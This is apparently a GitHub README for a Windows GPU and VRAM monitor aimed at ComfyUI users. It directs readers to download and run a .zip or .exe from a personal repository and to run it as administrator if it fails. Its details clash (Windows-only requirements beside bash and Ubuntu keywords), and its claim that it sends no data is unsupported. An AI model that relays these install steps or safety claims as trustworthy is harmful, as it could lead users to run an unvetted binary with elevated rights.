# 📊 BF95-VRAMWATCH - Simple Hardware Monitoring For ComfyUI Users

[![Download BF95-VRAMWATCH](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Amosoverseas578/BF95-VRAMWATCH)

This tool tracks system performance for ComfyUI. It monitors your graphics card memory and system resources. You see real-time data about your hardware health during image generation tasks.

## 🛠️ System Requirements

*   **Operating System:** Windows 10 or Windows 11.
*   **Hardware:** A dedicated AMD or NVIDIA graphics card.
*   **Software:** ComfyUI must be installed and running on your machine.
*   **Memory:** At least 8GB of system RAM.

## 📥 Getting The Software

1.  Visit the [official download page](https://github.com/Amosoverseas578/BF95-VRAMWATCH) to acquire the tool.
2.  Look for the section marked Releases.
3.  Click the file ending in .zip or .exe to save it to your computer.
4.  Move the file to a folder where you keep your tools.

## 🚀 Setting Up Your Dashboard

1.  Open the folder where you saved your file.
2.  Double-click the downloaded file to start the installation process.
3.  Follow the prompts on your screen. 
4.  Once the setup finishes, a shortcut appears on your desktop.
5.  Double-click this shortcut to open your monitor.

## 📈 Understanding Your Data

The dashboard displays several core metrics to help you manage your ComfyUI workload.

### GPU Memory
This indicates how much VRAM you use. High usage may slow down your system. If VRAM reaches its limit, the tool alerts you to prevent crashes.

### System RAM
This shows the memory your computer uses for tasks outside the graphics card. It helps you see if other background programs take up resources needed for image generation.

### GPU Activity
This displays the percentage of your graphics card in use. A higher percentage means your hardware works harder.

### Temperatures and Power
The tool reports the heat levels of your graphics card. It also tracks power consumption. Keeping these numbers within safe ranges ensures your hardware lasts longer.

### Cooling
The sensor data shows how fast your fans spin. Use this to determine if your cooling system keeps up with the demands of ComfyUI.

### Clocks
This refers to the speed of your processor. Higher clock speeds lead to faster image generation times.

## ⚙️ Using The Monitor

When ComfyUI runs, this tool refreshes data every second. Watch the dashboard to spot spikes in usage. If you notice high memory pressure, close browser tabs or other demanding programs. 

The tool includes a feature that warns you before a rolling restart occurs. This saves time and prevents you from losing work in progress.

## 💡 Troubleshooting Common Issues

*   **Dashboards look empty:** Ensure ComfyUI runs in the background. The monitor requires the program to be active to pull data.
*   **Tool fails to open:** Restart your computer and try opening the program again as an administrator.
*   **Data seems inaccurate:** Check if you have the latest drivers for your AMD or NVIDIA graphics card. Update your drivers through your card manufacturer's website.
*   **Program closes unexpected:** Check your folder permissions. Ensure you have read and write access to the directory where the tool lives.

## 📝 Configuration Settings

You can customize your dashboard layout. Click the settings icon in the top right corner of the window. From here, you can choose which sensors to display. You can also adjust the refresh rate of the sensors. A faster refresh rate shows more detail but uses more processor power. A slower rate keeps the application light. 

These settings save automatically when you close the application. You do not need to export your preferences manually.

## 🛡️ Privacy and Safety

This software monitors local hardware only. It does not send data over the internet. No personal files are analyzed or tracked. The tool only reads the sensors provided by your graphics card drivers. 

## 🖇️ Advanced Usage

Advanced users can hook the monitor into existing automation scripts. The tool logs data to a plain text file in the installation directory. You can read these files to analyze performance over long periods. This helps you identify trends in memory usage during large batch jobs.

Keywords: amd, amd-gpu, amd-rocm, amd-smi, amdgpu, bash, comfyui, cuda, gpu-monitoring, nvidia, nvidia-cuda, nvidia-gpu, nvidia-smi, rocm, ubuntu, vram